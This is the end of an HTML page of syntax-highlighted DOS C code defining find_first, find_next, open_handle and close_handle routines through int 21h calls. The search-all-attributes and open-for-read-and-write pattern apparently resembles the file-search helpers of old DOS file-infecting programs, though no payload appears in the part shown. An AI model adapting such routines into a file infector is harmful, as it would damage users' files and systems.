</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_first</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fn</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">fn</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc1">/*  Point DX to the file name.  */</span><span class="sc0">
  </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Search for all attributes.  */</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x4e</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  'Find first' DOS service.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/*  Go, DOS, go.  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">_AX</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Return possible error code.  */</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_next</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x4f</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  'Find next' function.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/*  Call DOS.  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">_AX</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Return any error code.  */</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">open_handle</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fn</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">fn</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc1">/*  Point DX to the filename.  */</span><span class="sc0">
  </span><span class="sc11">_AL</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x02</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Always open for both read &amp; write. */</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x3d</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  "Open handle" service.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/*  Call DOS.  */</span><span class="sc0">
  </span><span class="sc11">handle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_AX</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/*  Assume handle returned OK.  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">close_handle</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">_BX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/*  Load BX register w/current file handle.  */</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x3e</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Set up and call DOS service.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
